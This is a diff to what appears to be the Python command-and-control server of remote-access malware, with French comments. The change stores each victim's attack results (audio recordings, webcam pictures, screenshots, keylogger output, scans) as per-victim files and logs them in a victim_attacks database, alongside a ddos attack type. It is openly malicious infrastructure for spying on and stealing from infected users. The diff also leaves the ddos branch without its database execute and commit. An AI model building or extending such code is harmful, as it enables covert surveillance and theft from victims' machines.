@@ -267,12 +267,29 @@ def start_server(port, logger):
                     if attack_type == "ddos":
                         query = "UPDATE group_attacks SET state = 'done', result = %s WHERE id = %s"
                     else :
+                        # Vérification de l'existence du dossier pour y mettre le resultat de l'attaque
+                        if not os.path.exists("results/" + str(attack_type) + "/" + str(client['uid']) + "/"):
+                            os.makedirs("results/" + str(attack_type) + "/" + str(client['uid']) + "/")
+                        
+                        # Choix du nom du fichier de résultat (extension différente selon le type d'attaque)
+                        if attack_type == "record":
+                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".wav"
+                        elif attack_type == "picture" or attack_type == "screenshot" or attack_type == "monitor":
+                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".png"
+                        elif attack_type == "scan" or attack_type == "keylogger":
+                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".txt"
+                        
+                        # Ecriture du résultat dans le fichier
+                        with open(result_file_name, "wb") as f:
+                            f.write(base64.b64decode(attack_output))
+
+                        # Mise à jour de l'attaque dans la base de données
                         query = "UPDATE victim_attacks SET state = 'done', result = %s WHERE id = %s"
                     
-                    values = (attack_output, attack_id, )
-                    mycursor.execute(query, values)
+                        values = (result_file_name, attack_id, )
+                        mycursor.execute(query, values)
 
-                    db.commit()
+                        db.commit()
 
                     logger.info("attaque : " + str(attack_id) + " terminée")
                     print("[+] attack updated in the database (done !)")
